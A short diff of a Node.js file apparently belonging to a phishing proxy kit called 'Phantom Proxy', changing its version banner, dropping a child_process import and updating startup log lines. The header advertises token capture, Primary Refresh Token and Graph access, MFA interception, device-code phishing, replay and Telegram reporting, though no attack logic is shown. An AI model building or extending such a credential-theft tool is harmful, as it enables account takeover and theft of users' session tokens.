@@ -1,7 +1,9 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.5 — WEBSOCKET FIXED (NO PHISHLETS)
+// 🥔 PHANTOM PROXY v10.6 — FINAL STABLE (ALL FEATURES)
 // ============================================================
-// 🔥 FEATURES: Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Capture + MFA + WEBSOCKETS
+// 🔥 Proxy + Dashboard + Telegram + PRT + Graph + Token Vault
+// 🔥 Device Code + Analytics + Webmail + Replay + Capture + MFA
+// 🔥 WEBSOCKETS + NO DUPLICATE HANDLER
 // ============================================================
 
 const http = require("http");
@@ -11,7 +13,6 @@ const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
 const os = require("os");
-const { exec } = require("child_process");
 
 // ── ✅ SAFE REQUIRE ──
 let axios, AdmZip, WebSocket, FormData;
@@ -2406,7 +2407,7 @@ if (WebSocket) {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.5 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.6 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: http://localhost:${PORT}/device`);
     console.log(`🔌 WebSocket: ws://localhost:${PORT}/ws`);
